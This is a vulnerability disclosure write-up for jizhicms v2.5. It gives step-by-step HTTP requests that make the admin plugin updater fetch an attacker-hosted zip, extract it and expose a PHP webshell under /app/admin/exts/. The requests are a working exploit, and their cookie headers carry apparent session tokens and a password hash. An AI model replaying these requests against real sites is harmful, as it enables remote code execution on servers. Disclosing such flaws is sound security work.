In the jizhicms v_2.5 content management system, there are arbitrary files uploaded and arbitrary code executed in the background

After logging in to the background, perform packet capture at the plug-in download site

![image-20240417082228150](https://github.com/XiLitter/CMS_vulnerability-discovery/blob/main/jizhicms1.png)

Download url parameters are user controllable

![image-20240417082417122](https://github.com/XiLitter/CMS_vulnerability-discovery/blob/main/jizhicms2.png)

The malicious php code is constructed locally and then compressed into a zip file format

![image-20240417082544616](https://github.com/XiLitter/CMS_vulnerability-discovery/blob/main/jizhicms3.png)

Start a web service locally with python

![image-20240417082748932](https://github.com/XiLitter/CMS_vulnerability-discovery/blob/main/jizhicms4.png)

The HTTP request packet is constructed as follows

```
POST /index.php/admins/Plugins/update.html HTTP/1.1
Host: localhost:7080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 75
Origin: http://localhost:7080
Connection: close
Referer: http://localhost:7080/index.php/admins/Plugins/index.html
Cookie: _ga=GA1.1.411633462.1675085596; Idea-471eb550=698bfe4b-232c-4352-9e3d-fe02464850ff; USER_NAME_COOKIE=admin; SID_1=a8b953b4; ajs_anonymous_id=2bad451d-4aa2-4ea8-9093-b89e3986a36e; ajs_user_id=048546bfc1e19205a55a5993547bc9308acf5a9c; Pycharm-1482e871=15e26aac-0918-491d-9086-904339580e27; Phpstorm-a18e6472=137e6e51-3adf-42a0-b6fb-860f31ab39a0; UserName=xilitter; PassWord=e10adc3949ba59abbe56e057f20f883e; userid=1; t00ls=e54285de394c4207cd521213cebab040; t00ls_s=YTozOntzOjQ6InVzZXIiO3M6MjY6InBocCB8IHBocD8gfCBwaHRtbCB8IHNodG1sIjtzOjM6ImFsbCI7aTowO3M6MzoiaHRhIjtpOjE7fQ%3D%3D; zzz629_adminpass=0; zzz629_adminname=admin; zzz629_admintime=1712306735; zzz629_adminface=..%2Fplugins%2Fface%2Fface01.png; zzz417_adminpass=0; zzz417_adminname=admin; zzz417_admintime=1712308843; zzz417_adminface=..%2Fplugins%2Fface%2Fface02.png; admin_login_username=admin; iframeScroll=; bosscmsuid=ro8rad75; bosscmsuidas=f1c2ab9ee32382c9e2; iframeContentTreeScroll=322; remember-me=YWRtaW46MTcxMzg2MjA5MzAzMDpkYzdkZGU0NzIzNTI5MGE3ZjRkYjEyNGQ1MDM1MzBkYg; _jspxcms=96f13cf433dd4e33af1490b0f0559103; PHPSESSID=18cspd5qgknap1o2m98vemm1fd

action=start-download&filepath=123&download_url=http://127.0.0.1:8081/1.zip
```

After packet sending, a file named update_123.zip is added to the cache directory

![image-20240417083143302](https://github.com/XiLitter/CMS_vulnerability-discovery/blob/main/jizhicms5.png)

Construct the following request package to decompress the downloaded Trojan package

```
POST /index.php/admins/Plugins/update.html HTTP/1.1
Host: localhost:7080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 30
Origin: http://localhost:7080
Connection: close
Referer: http://localhost:7080/index.php/admins/Plugins/index.html
Cookie: _ga=GA1.1.411633462.1675085596; Idea-471eb550=698bfe4b-232c-4352-9e3d-fe02464850ff; USER_NAME_COOKIE=admin; SID_1=a8b953b4; ajs_anonymous_id=2bad451d-4aa2-4ea8-9093-b89e3986a36e; ajs_user_id=048546bfc1e19205a55a5993547bc9308acf5a9c; Pycharm-1482e871=15e26aac-0918-491d-9086-904339580e27; Phpstorm-a18e6472=137e6e51-3adf-42a0-b6fb-860f31ab39a0; UserName=xilitter; PassWord=e10adc3949ba59abbe56e057f20f883e; userid=1; t00ls=e54285de394c4207cd521213cebab040; t00ls_s=YTozOntzOjQ6InVzZXIiO3M6MjY6InBocCB8IHBocD8gfCBwaHRtbCB8IHNodG1sIjtzOjM6ImFsbCI7aTowO3M6MzoiaHRhIjtpOjE7fQ%3D%3D; zzz629_adminpass=0; zzz629_adminname=admin; zzz629_admintime=1712306735; zzz629_adminface=..%2Fplugins%2Fface%2Fface01.png; zzz417_adminpass=0; zzz417_adminname=admin; zzz417_admintime=1712308843; zzz417_adminface=..%2Fplugins%2Fface%2Fface02.png; admin_login_username=admin; iframeScroll=; bosscmsuid=ro8rad75; bosscmsuidas=f1c2ab9ee32382c9e2; iframeContentTreeScroll=322; remember-me=YWRtaW46MTcxMzg2MjA5MzAzMDpkYzdkZGU0NzIzNTI5MGE3ZjRkYjEyNGQ1MDM1MzBkYg; _jspxcms=96f13cf433dd4e33af1490b0f0559103; PHPSESSID=18cspd5qgknap1o2m98vemm1fd

action=file-upzip&filepath=123
```

At this point, the malicious file we constructed has been extracted, and the malicious code can be executed by accessing /app/admin/exts/1.php in the viewer

![image-20240417084231817](https://github.com/XiLitter/CMS_vulnerability-discovery/blob/main/jizhicms6.png)